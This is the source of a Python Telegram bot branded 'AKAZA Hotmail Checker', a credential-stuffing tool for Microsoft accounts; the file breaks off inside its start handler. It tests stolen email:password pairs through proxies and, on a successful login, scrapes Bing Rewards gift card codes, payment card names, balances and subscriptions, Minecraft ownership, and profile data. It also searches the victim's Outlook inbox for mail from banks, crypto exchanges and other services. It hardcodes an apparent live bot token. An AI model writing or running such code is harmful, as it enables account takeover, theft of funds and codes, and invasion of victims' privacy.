import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading, requests, urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from html import escape
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# Logging Setup
urllib3.disable_warnings()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# CONFIG
BOT_TOKEN = os.getenv('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
ADMIN_ID = int(os.getenv('ADMIN_ID', '5944410248'))
DB = os.getenv('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500

SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()

class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), fetchone=False, fetchall=False, commit=True):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            try:
                cursor = conn.cursor()
                cursor.execute(query, params)
                if commit:
                    conn.commit()
                if fetchone:
                    return cursor.fetchone()
                if fetchall:
                    return cursor.fetchall()
            finally:
                conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "",
            threads INTEGER DEFAULT 10, fast_mode INTEGER DEFAULT 0,
            keyword_search INTEGER DEFAULT 0, is_adding_kw INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
            email TEXT, status TEXT, details TEXT, date TEXT)''')
        try:
            self._execute('ALTER TABLE settings ADD COLUMN keyword_search INTEGER DEFAULT 0')
        except: pass
        try:
            self._execute('ALTER TABLE settings ADD COLUMN is_adding_kw INTEGER DEFAULT 0')
        except: pass

    def add_user(self, uid, username, first_name):
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date, credits) VALUES (?, ?, ?, ?, ?)',
                      (uid, username, first_name, datetime.now().isoformat(), 2000))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid):
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            return bool(res[0])
        return False

    def has_access(self, uid):
        if uid == ADMIN_ID:
            return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res:
            return False
        has_acc, expiry, banned = res
        if banned:
            return False
        if not has_acc:
            return False
        if expiry:
            try:
                if datetime.now() > datetime.fromisoformat(expiry):
                    return False
            except:
                return False
        return True

    def is_mod(self, uid):
        if uid == ADMIN_ID:
            return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            return bool(res[0])
        return False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID:
            return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def get_credits(self, uid):
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            return res[0]
        return 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0, access_expiry = NULL WHERE user_id = ?', (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (1 if val else 0, uid))

    def get_all_user_ids(self):
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        if res:
            return [r[0] for r in res]
        return []

    def get_user_info(self, uid):
        res = self._execute('SELECT user_id, username, first_name, credits, has_access, is_banned, is_mod, total_checks, total_hits, join_date, access_expiry FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            cols = ['user_id', 'username', 'first_name', 'credits', 'has_access', 'is_banned', 'is_mod', 'total_checks', 'total_hits', 'join_date', 'access_expiry']
            return dict(zip(cols, res))
        return {}

    def get_user_settings(self, uid):
        res = self._execute('SELECT keywords, threads, fast_mode, keyword_search, is_adding_kw FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res[0].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res[1], 'fast_mode': bool(res[2]), 'keyword_search': bool(res[3]), 'is_adding_kw': bool(res[4])}
        return {'keywords': [], 'threads': 10, 'fast_mode': False, 'keyword_search': False, 'is_adding_kw': False}

    def update_settings(self, uid, keywords=None, threads=None, fast_mode=None, keyword_search=None, is_adding_kw=None):
        if keywords is not None:
            self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
        if threads is not None:
            self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if fast_mode is not None:
            self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))
        if keyword_search is not None:
            self._execute('UPDATE settings SET keyword_search = ? WHERE user_id = ?', (1 if keyword_search else 0, uid))
        if is_adding_kw is not None:
            self._execute('UPDATE settings SET is_adding_kw = ? WHERE user_id = ?', (1 if is_adding_kw else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)',
                      (uid, email, status, json.dumps(details_dict), datetime.now().isoformat()))
        if status == 'hit':
            self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))

    def get_global_stats(self):
        total_res = self._execute('SELECT COUNT(*) FROM users', fetchone=True)
        total = total_res[0] if total_res else 0
        active_res = self._execute('SELECT COUNT(*) FROM users WHERE has_access = 1', fetchone=True)
        active = active_res[0] if active_res else 0
        c_res = self._execute('SELECT SUM(total_checks) FROM users', fetchone=True)
        checks = c_res[0] if c_res and c_res[0] else 0
        h_res = self._execute('SELECT SUM(total_hits) FROM users', fetchone=True)
        hits = h_res[0] if h_res and h_res[0] else 0
        return {'total': total, 'active': active, 'checks': checks, 'hits': hits}

    def list_mods(self):
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        if res:
            return [{'uid': r[0], 'username': r[1]} for r in res]
        return []

# ============================================================================
# SERVICE_KEYWORDS DICT
# ============================================================================
SERVICE_KEYWORDS = {
    "instagram.com": "Instagram", "mail.instagram.com": "Instagram", "facebook.com": "Facebook", "facebookmail.com": "Facebook",
    "twitter.com": "Twitter", "tiktok.com": "TikTok", "snapchat.com": "Snapchat", "discord.com": "Discord",
    "telegram.org": "Telegram", "reddit.com": "Reddit", "linkedin.com": "LinkedIn", "twitch.tv": "Twitch",
    "onlyfans.com": "OnlyFans", "patreon.com": "Patreon", "vk.com": "VK", "whatsapp.com": "WhatsApp",
    "youtube.com": "YouTube", "netflix.com": "Netflix", "spotify.com": "Spotify", "disney.com": "Disney+",
    "hulu.com": "Hulu", "hbo.com": "HBO Max", "amazon.com": "Amazon", "ebay.com": "eBay",
    "aliexpress.com": "AliExpress", "etsy.com": "Etsy", "walmart.com": "Walmart", "target.com": "Target",
    "shopify.com": "Shopify", "nike.com": "Nike", "adidas.com": "Adidas", "ubereats.com": "Uber Eats",
    "doordash.com": "DoorDash", "grubhub.com": "Grubhub", "deliveroo.com": "Deliveroo", "uber.com": "Uber",
    "lyft.com": "Lyft", "airbnb.com": "Airbnb", "booking.com": "Booking.com", "expedia.com": "Expedia",
    "dropbox.com": "Dropbox", "google.com": "Google Drive", "onedrive.com": "OneDrive", "icloud.com": "iCloud",
    "nordvpn.com": "NordVPN", "expressvpn.com": "ExpressVPN", "surfshark.com": "Surfshark", "protonvpn.com": "ProtonVPN",
    "coursera.org": "Coursera", "udemy.com": "Udemy", "duolingo.com": "Duolingo", "grammarly.com": "Grammarly",
    "office365.com": "Office 365", "zoom.us": "Zoom", "slack.com": "Slack", "adobe.com": "Adobe",
    "canva.com": "Canva", "xbox.com": "Xbox", "playstation.com": "PlayStation", "nintendo.com": "Nintendo",
    "steampowered.com": "Steam", "epicgames.com": "Epic Games", "riotgames.com": "Riot Games",
    "minecraft.net": "Minecraft", "roblox.com": "Roblox", "ubisoft.com": "Ubisoft", "ea.com": "EA Play",
    "blizzard.com": "Blizzard", "valorant.com": "Valorant", "fortnite.com": "Fortnite", "pubg.com": "PUBG",
    "cod.com": "Call of Duty", "rockstargames.com": "Rockstar", "paypal.com": "PayPal", "venmo.com": "Venmo",
    "cash.app": "Cash App", "stripe.com": "Stripe", "revolut.com": "Revolut", "wise.com": "Wise",
    "coinbase.com": "Coinbase", "binance.com": "Binance", "kraken.com": "Kraken", "robinhood.com": "Robinhood"
}

# ============================================================================
# AkazaChecker CLASS
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            p = self.format_proxy(proxy)
            if p:
                self.session.proxies = {'http': p, 'https': p}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

    def format_proxy(self, proxy_str):
        proxy_str = proxy_str.strip()
        if not proxy_str:
            return None
        if proxy_str.startswith(('http://','https://','socks')):
            return proxy_str
        parts = proxy_str.split(':')
        if len(parts) == 4:
            return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
        elif len(parts) == 2:
            return f'http://{proxy_str}'
        return proxy_str

    def get_sftag_params(self):
        for _ in range(3):
            try:
                resp = self.session.get(SFTAG_URL, timeout=10)
                text = resp.text
                ppft_m = (re.search('value=\\\\"(.+?)\\\\"', text, re.S) or
                          re.search('value="(.+?)"', text, re.S) or
                          re.search("sFTTag:'(.+?)'", text, re.S) or
                          re.search('sFTTag:"(.+?)"', text, re.S) or
                          re.search('name="PPFT".*?value="(.+?)"', text, re.S))
                urlp_m = (re.search('"urlPost":"(.+?)"', text, re.S) or
                             re.search("urlPost:'(.+?)'", text, re.S) or
                             re.search('<form.*?action="(.+?)"', text, re.S))
                if ppft_m and urlp_m:
                    return urlp_m.group(1).replace('&amp;', '&'), ppft_m.group(1)
            except: pass
            time.sleep(0.1)
        return None, None

    def do_login(self, email, password, urlPost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                resp = self.session.post(urlPost, data=data, allow_redirects=True, timeout=12)
                if '#' in resp.url and resp.url != SFTAG_URL:
                    tk = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
                    if tk != 'None':
                        return 'TOKEN', tk
                elif 'cancel?mkt=' in resp.text:
                    try:
                        ipt = re.search(r'name="ipt" value="([^"]+)"', resp.text).group(1)
                        pprid = re.search(r'name="pprid" value="([^"]+)"', resp.text).group(1)
                        uaid = re.search(r'name="uaid" value="([^"]+)"', resp.text).group(1)
                        action = re.search(r'id="fmHF" action="([^"]+)"', resp.text).group(1)
                        if action.startswith('/'):
                            action = 'https://login.live.com' + action
                        ret = self.session.post(action, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True, timeout=10)
                        rurl_m = re.search(r'"returnUrl":"([^"]+)"', ret.text)
                        if rurl_m:
                            rurl = rurl_m.group(1).replace('\\u0026', '&')
                            fin_resp = self.session.get(rurl, allow_redirects=True, timeout=10)
                            tk = parse_qs(urlparse(fin_resp.url).fragment).get('access_token', ['None'])[0]
                            if tk != 'None':
                                return 'TOKEN', tk
                    except: pass
                    return '2FA', None
                elif any(v in resp.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA', None
                elif any(v in resp.text.lower() for v in ['password is incorrect', "account doesn't exist", "microsoft account doesn't exist", 'sign in to your microsoft account', 'tried to sign in too many times', 'help us protect your account']):
                    return 'BAD', None
            except: pass
            time.sleep(0.1)
        return 'ERROR', None

    def do_hit_login(self, email, password):
        try:
            s = requests.Session()
            s.verify = False
            s.proxies = self.session.proxies
            params = {"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "scope": "profile openid offline_access https://outlook.office.com/M365.Access", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "login_hint": email, "response_type": "code", "client_info": "1", "haschrome": "1", "mkt": "en"}
            auth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{unquote(requests.utils.urlencode(params))}"
            res_auth = s.get(auth_url, timeout=12)
            up_match = re.search(r'urlPost":"([^"]+)"', res_auth.text)
            if not up_match:
                return None, None
            up = up_match.group(1).replace("\\/", "/")
            pp_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', res_auth.text)
            if not pp_match:
                return None, None
            pp = pp_match.group(1)
            data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={pp}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
            res_login = s.post(up, data=data, headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://login.live.com", "Referer": res_auth.url}, allow_redirects=False, timeout=12)
            location = res_login.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return None, None
            code = code_match.group(1)
            cid = s.cookies.get('MSPCID', '').upper()
            token_res = s.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data={"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}, timeout=10)
            if token_res.status_code == 200:
                return token_res.json().get("access_token"), cid
        except: pass
        return None, None

    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text:
                break
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form', id='fmHF')
            if not form:
                break
            action = form['action']
            if action.startswith('/'):
                action = 'https://login.live.com' + action
            data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
            resp = self.session.post(action, data=data, timeout=10, allow_redirects=True)
        return resp

    def get_rewards_points(self):
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", headers={'Referer': 'https://rewards.bing.com/', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'}, timeout=8)
            if r.status_code == 200:
                d = r.json()
                pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if pts is not None:
                    return int(pts)
        except: pass
        try:
            r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", timeout=8)
            if r.status_code == 200:
                pts = r.json().get('userInfo', {}).get('balance')
                if pts is not None:
                    return int(pts)
        except: pass
        try:
            r = self.session.get("https://rewards.bing.com", timeout=10)
            r = self.handle_fmhf(r)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m:
                p = int(m.group(1))
                if 0 <= p <= 500000:
                    return p
        except: pass
        return 0

    def get_redemption_codes(self):
        codes = []
        try:
            r = self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10)
            if 'fmHF' in r.text or 'JavaScript required' in r.text:
                soup = BeautifulSoup(r.text, 'html.parser')
                form = soup.find('form', id='fmHF')
                if form:
                    action = form['action']
                    if action.startswith('/'):
                        action = 'https://login.live.com' + action
                    data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
                    self.session.post(action, data=data, timeout=10)
                    r = self.session.get('https://rewards.bing.com/redeem/orderhistory', timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            vt = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            token = vt['value'] if vt else ''
            table = soup.find('table', class_='table')
            rows = table.find_all('tr') if table else []
            p5, p4, p3 = r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'
            ex = {'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS', 'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER', 'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER', 'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB', 'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND', 'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION', 'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'}
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3:
                    continue
                title = cells[2].get_text(strip=True)
                date = cells[1].get_text(strip=True)
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'):
                        act = 'https://rewards.bing.com' + act
                    try:
                        cr = self.session.post(act, data={'__RequestVerificationToken': token}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10)
                        html = cr.text
                        code = None
                        rs = BeautifulSoup(html, 'html.parser').find('div', class_='resendSuccess')
                        if rs:
                            ks = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                            vs = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                            for k, v in zip(ks, vs):
                                if any(x in k.get_text(strip=True).upper() for x in ['CODE', 'PIN']):
                                    code = v.get_text(strip=True)
                                    if '*' not in code:
                                        break
                        if not code:
                            for p in [p5, p4, p3]:
                                m = re.search(p, html)
                                if m and '*' not in m.group() and m.group().upper() not in ex:
                                    code = m.group()
                                    break
                        if not code:
                            m = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', html, re.I) or re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', html, re.I)
                            if m:
                                code = m.group(1)
                        if code:
                            rurl_m = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', html)
                            codes.append({'code': code, 'category': self.detect_category(title, html), 'info': title, 'redemption_url': rurl_m.group(1) if rurl_m else '', 'date': date})
                    except: pass
                else:
                    txt = cells[3].get_text(strip=True) if len(cells) > 3 else cells[2].get_text(strip=True)
                    for p in [p5, p4, p3]:
                        m = re.search(p, txt.upper())
                        if m and '*' not in m.group() and m.group() not in ex:
                            codes.append({'code': m.group(), 'category': self.detect_category(title, txt), 'info': title, 'redemption_url': '', 'date': date})
                            break
            if not codes:
                for p in [p5, p4, p3]:
                    ms = re.findall(p, r.text.upper())
                    for m in ms:
                        if '*' not in m and m not in ex:
                            codes.append({'code': m, 'category': 'Unknown', 'info': 'Found in page', 'redemption_url': '', 'date': ''})
        except: pass
        return codes

    def detect_category(self, title, row_text=''):
        t = (title + row_text).lower()
        if 'overwatch' in t: return 'Overwatch'
        if any(x in t for x in ['sea of thieves', 'ancient coins']): return 'Sea of Thieves'
        if any(x in t for x in ['roblox', 'robux']): return 'Roblox'
        if any(x in t for x in ['league of legends', 'riot points']): return 'League of Legends'
        if any(x in t for x in ['game pass', 'gamepass']): return 'Game Pass'
        if any(x in t for x in ['minecraft', 'minecoins']): return 'Minecraft'
        if any(x in t for x in ['gift card', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'spotify']): return 'Gift Card'
        return 'Unknown'

    def get_microsoft_subs(self):
        try:
            uid = uuid.uuid4().hex[:16]
            st = json.dumps({"userId": uid, "scopeSet":"pidl"})
            r = self.session.get(f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth&state={quote(st)}&prompt=none", timeout=20)
            tk_match = re.search(r'access_token=([^&\s"\']+)', r.text + r.url)
            if not tk_match: return {"status":"FREE","subs":[]}
            tk = unquote(tk_match.group(1))
            h = {"Authorization": f'MSADELEGATE1.0="{tk}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
            rb = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=h, timeout=15).text
            bal = re.search(r'"balance"\s*:\s*([0-9.]+)', rb)
            card = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', rb, re.DOTALL)
            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=h, timeout=15).text
            subs = []
            kw = {'Xbox Game Pass Ultimate': 'ULTIMATE', 'PC Game Pass': 'PC GAME PASS', 'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD', 'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL', 'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
            for k, v in kw.items():
                if k in rt:
                    m = re.search(fr'"{k}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt)
                    rd = m.group(1) if m else None
                    days = 0
                    if rd:
                        try:
                            rd_dt = datetime.fromisoformat(rd)
                            days = (rd_dt - datetime.now()).days
                        except: pass
                    subs.append({'name': v, 'renewal_date': rd, 'days_remaining': days, 'is_expired': days < 0})
            return {"status": "PREMIUM" if subs else "FREE", "subs": subs, "balance": f"${bal.group(1)}" if bal else "", "card": card.group(1) if card else ""}
        except: return {"status":"FREE","subs":[]}

    def get_profile(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=15).json()
            country = r.get('country') or r.get('location', {}).get('country') or (r.get('accounts', [{}])[0].get('location') if r.get('accounts') else "")
            return (r.get('displayName', ""), country)
        except: return ("", "")

    def get_minecraft(self, tk):
        try:
            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={tk}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}).json()
            xt = r1['Token']
            uhs = r1['DisplayClaims']['xui'][0]['uhs']
            r2 = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xt]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}).json()
            xst = r2['Token']
            r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken": f"XBL3.0 x={uhs};{xst}"}).json()
            mt = r3['access_token']
            r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization": f"Bearer {mt}"})
            if r4.status_code == 200:
                d = r4.json()
                return {"owned": True, "username": d['name'], "uuid": d['id'], "capes": [c.get('alias') for c in d.get('capes', [])]}
        except: pass
        return {"owned": False}

    def scan_inbox(self, email, password, user_keywords):
        tk, cid = self.do_hit_login(email, password)
        if not tk: return {}, "0"

        ic = "0"
        s = requests.Session()
        s.verify = False
        s.proxies = self.session.proxies
        sh = {"Host": "outlook.live.com", "authorization": f"Bearer {tk}", "user-agent": "Mozilla/5.0", "action": "StartupData", "content-type": "application/json"}
        try:
            r = s.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers=sh, timeout=20)
            if r.status_code == 200:
                m = re.search(r'"DisplayName":"Inbox","TotalCount":(\d+)', r.text) or re.search(r'"TotalCount":(\d+)', r.text)
                if m: ic = m.group(1)
        except: pass

        res = {}
        combined = list(set(list(SERVICE_KEYWORDS.keys()) + user_keywords))
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        url = "https://outlook.live.com/search/api/v2/query"
        for i in range(0, len(combined), 8):
            batch = combined[i:i+8]
            q = " OR ".join([f'"{k}"' for k in batch])
            payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": q}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
            try:
                r = s.post(url, json=payload, headers=h, timeout=15)
                if r.status_code == 200:
                    data = r.json()
                    sets = data.get('EntitySets', [{}])
                    if sets and sets[0].get('ResultSets', [{}])[0].get('Total', 0) > 0:
                        for kw in batch:
                            payload['EntityRequests'][0]['Query']['QueryString'] = f'"{kw}"'
                            ri = s.post(url, json=payload, headers=h, timeout=10)
                            if ri.status_code == 200:
                                ti = ri.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                                if ti > 0:
                                    res[SERVICE_KEYWORDS.get(kw, kw)] = ti
            except: pass
        return res, ic

    def check(self, email, password, uk=[], fast_mode=False):
        up, pp = self.get_sftag_params()
        if not up:
            return {'status': 'error'}
        st, tk = self.do_login(email, password, up, pp)
        if st != 'TOKEN':
            return {'status': st.lower() if st else 'error'}
        cid = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), "")
        pts, codes, subs, profile, mc, inbox, ic = 0, [], {}, ("", ""), {"owned": False}, {}, "0"
        try: pts = self.get_rewards_points()
        except: pass
        try: codes = self.get_redemption_codes()
        except: pass
        if not fast_mode:
            try: subs = self.get_microsoft_subs()
            except: pass
            try: profile = self.get_profile(tk, cid)
            except: pass
            try: mc = self.get_minecraft(tk)
            except: pass
            if uk:
                try: inbox, ic = self.scan_inbox(email, password, uk)
                except: pass
        return {'status': 'hit', 'email': email, 'password': password, 'name': profile[0], 'country': profile[1], 'pts': pts, 'codes': codes, 'subs': subs, 'mc': mc, 'inbox': inbox, 'inbox_count': ic}

akaza_db = AkazaDatabase(DB)
user_proxies = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    akaza_db.add_user(u.id, u.username, u.first_name)
    if akaza_db.is_banned(u.id): return
    i, s = akaza_db.get_user_info(u.id), akaza_db.get_user_settings(u.id)
    msg = (f"💠 <b>AKAZA Hotmail Checker</b> 💠\n\n👤 <b>User:</b> <code>{u.first_name}</code>\n💰 <b>Credits:</b> <code>{i['credits']}</code>\n"
           f"⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n🔍 <b>Search:</b> <code>{'ON' if s['keyword_search'] else 'OFF'}</code>\n🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>")
